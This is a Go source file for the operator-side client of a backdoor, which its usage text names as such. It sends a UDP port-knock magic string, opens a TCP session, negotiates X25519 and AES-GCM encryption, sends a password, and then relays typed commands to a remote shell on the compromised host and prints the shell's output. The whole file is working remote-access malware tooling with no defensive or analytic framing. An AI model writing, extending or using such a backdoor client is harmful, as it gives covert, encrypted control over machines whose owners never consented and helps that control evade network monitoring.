package main

import (
	"bufio"
	"crypto/aes"
	"crypto/cipher"
	"crypto/ecdh"
	"crypto/hmac"
	"crypto/rand"
	"crypto/sha256"
	"flag"
	"fmt"
	"net"
	"os"
	"sync"
	"time"

	"golang.org/x/crypto/hkdf"
)

var pwd bool = false

const UDPMAGIC = "!@fizzbuzz@!"

func seal(msg []byte, info []byte, gcm cipher.AEAD) []byte {
	nonce := make([]byte, gcm.NonceSize())
	rand.Read(nonce)
	ct := gcm.Seal(nonce, nonce, msg, info)
	return ct
}

func open(buf []byte, info []byte, gcm cipher.AEAD) ([]byte, error) {
	nonce := buf[:gcm.NonceSize()]
	ct := buf[gcm.NonceSize():]
	return gcm.Open(nil, nonce, ct, info)
}

func sendThread(conn net.Conn, gcm cipher.AEAD, info []byte) {
	reader := bufio.NewReader(os.Stdin)
	for {
		in, _ := reader.ReadString('\n')
		ct := seal([]byte(in), info, gcm)
		conn.Write(ct)
	}
}

func recvThread(conn net.Conn, gcm cipher.AEAD, info []byte, wg *sync.WaitGroup) {
	buf := make([]byte, 1052)
	pwd = true
	for {
		if pwd {
			ct := seal([]byte("pwd\n"), info, gcm)
			conn.Write(ct)
			r, err := conn.Read(buf)
			if err != nil {
				break
			}
			tempBuf := buf[:r]
			pt, err := open(tempBuf, info, gcm)
			if err != nil {
				fmt.Println("err in pwd")
				break
			}
			fmt.Print(string(pt[:len(pt)-1]) + "> ")
		}

		r, err := conn.Read(buf)
		if err != nil {
			break
		}
		if r == 1052 {
			pwd = false
		} else {
			pwd = true
		}
		tempBuf := buf[:r]
		pt, err := open(tempBuf, info, gcm)
		if err != nil {
			fmt.Println("err")
			break
		}
		fmt.Print(string(pt))
	}
	wg.Done()
}

func main() {
	PASS := flag.String("p", "\000", "PASSWORD argument: required")
	CONN_HOST := flag.String("h", "\000", "HOST argument: required")
	CONN_PORT := flag.String("t", "\000", "TCPPORT argument: required")
	CONN_UDPPORT := flag.String("u", "\000", "UDPPORT argument: required")
	flag.Parse()

	if *PASS == "\000" || *CONN_HOST == "\000" || *CONN_PORT == "\000" || *CONN_UDPPORT == "\000" {
		fmt.Println("You must provide all of these required flags:")
		fmt.Println("-p: the password to this backdoor")
		fmt.Println("-t: the tcp port used for main communication")
		fmt.Println("-u: the udp port used for knocking")
		fmt.Println("-h: the hostname")
		os.Exit(1)
	}

	// Begin connection
	udp, uerr := net.Dial("udp", *CONN_HOST+":"+*CONN_UDPPORT)
	if uerr != nil {
		fmt.Println("Error dialing the backdoor, exiting...")
		os.Exit(1)
	}
	udp.Write([]byte(UDPMAGIC))
	udp.Close()
	var conn net.Conn
	var err error
	// Retry every 250ms for 2s
	for i := 0; i < 8; i++ {
		conn, err = net.Dial("tcp", *CONN_HOST+":"+*CONN_PORT)
		if err != nil {
			time.Sleep(250 * time.Millisecond)
		} else {
			break
		}
	}
	if err != nil {
		fmt.Println("Error dialing the backdoor, exiting...")
		os.Exit(1)
	}
	defer conn.Close()

	// Generate private and public keys
	priv, _ := ecdh.Curve.GenerateKey(ecdh.X25519(), rand.Reader)
	pub := priv.PublicKey()

	// Send the server our public key
	conn.Write(pub.Bytes())

	// Read in the server's public key and derive the shared secret
	buf := make([]byte, 1024)
	readLen, _ := conn.Read(buf)
	remote, _ := ecdh.X25519().NewPublicKey(buf[:readLen])
	shared, _ := priv.ECDH(remote)

	// Derive the AES key and HMAC key
	kdf := hkdf.New(sha256.New, shared, nil, nil)
	var gcmKey [32]byte
	var hmacKey [32]byte
	kdf.Read(gcmKey[:])
	kdf.Read(hmacKey[:])

	// Make the AES cipher
	c, _ := aes.NewCipher(gcmKey[:])
	gcm, _ := cipher.NewGCM(c)

	// Make an associated data with all of our sent packets
	info := []byte(conn.RemoteAddr().String() + conn.LocalAddr().String())
	hm := hmac.New(sha256.New, hmacKey[:])
	hm.Write(info)
	info = hm.Sum(nil)

	// Send the password, TODO. make it parameterizable
	pt := []byte(*PASS)
	ct := seal(pt, info, gcm)
	conn.Write(ct)

	// Read the ack from server
	readLen, err = conn.Read(buf)
	if err != nil {
		fmt.Println("Server likely closed connection due to wrong password")
		os.Exit(1)
	}
	tempBuf := buf[:readLen]
	ack, err := open(tempBuf, info, gcm)
	if err != nil {
		fmt.Println("Failed to decrypt")
	}
	if string(ack) != "ack" {
		os.Exit(1)
	}

	// Start threads for handling connection
	var wg sync.WaitGroup
	wg.Add(1)
	go sendThread(conn, gcm, info[:])
	go recvThread(conn, gcm, info[:], &wg)
	wg.Wait()
}
